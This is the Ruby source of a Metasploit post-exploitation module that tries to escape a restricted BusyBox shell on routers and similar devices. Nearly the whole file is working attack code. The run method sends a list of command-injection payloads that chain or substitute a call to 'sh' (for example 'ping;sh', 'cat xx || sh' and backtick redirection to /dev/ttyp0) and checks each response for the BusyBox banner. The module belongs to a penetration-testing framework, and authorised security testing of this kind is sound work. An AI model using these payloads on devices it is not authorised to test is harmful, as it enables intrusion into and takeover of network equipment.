##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize
    super(
      'Name'         => 'BusyBox Jailbreak ',
      'Description'  => 'This module will send a set of commands to a open
                         session that is connected to a BusyBox limited shell
                         (i.e. a router limited shell). It will try different
                         known tricks to try to jailbreak the limited shell and
                         get a full sh busybox shell.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )
  end

  def run
    bfound = false
    bfound = try_command("cat xx || sh\n","1_1") unless bfound
    bfound = try_command("ping || sh\n","1_2") unless bfound
    bfound = try_command("echo `sh >> /dev/ttyp0`\n","2_1") unless bfound
    bfound = try_command("ping `sh >> /dev/ttyp0`\n","2_2") unless bfound
    bfound = try_command("cat `sh >> /dev/ttyp0`\n","2_3") unless bfound
    bfound = try_command("cat xx;sh\n","3_1") unless bfound
    bfound = try_command("echo xx;sh\n","3_2") unless bfound
    bfound = try_command("ping;sh\n","3_3") unless bfound
    bfound = try_command("cat xx | sh\n","4_1") unless bfound
    bfound = try_command("ping | sh\n","4_2") unless bfound
    bfound = try_command("cat ($sh)\n","5_1") unless bfound
    bfound = try_command("echo ($sh) xx\n","5_2") unless bfound
    bfound = try_command("ping ($sh)\n","5_3") unless bfound
    bfound = try_command("cat xx &amp;&amp; sh\n","6_1") unless bfound
    bfound = try_command("echo xx &amp;&amp; sh\n","6_2") unless bfound
    bfound = try_command("ping &amp;&amp; sh\n","3_3") unless bfound
    print_error("Unable to jailbreak device shell.") if !bfound
  end

  def try_command(param_command, method_number)
      vprint_status("jailbreak sent: #{param_command}.")
      session.shell_write(param_command)
      (1..10).each do
        resp = session.shell_read()
        vprint_status("jailbreak received: #{resp}.")
        if ((resp.include? "BusyBox") && (resp.include? "Built-in shell"))
          vprint_status("Done method " + method_number + ".")
          return true
        end
      end
      return false
  end

end
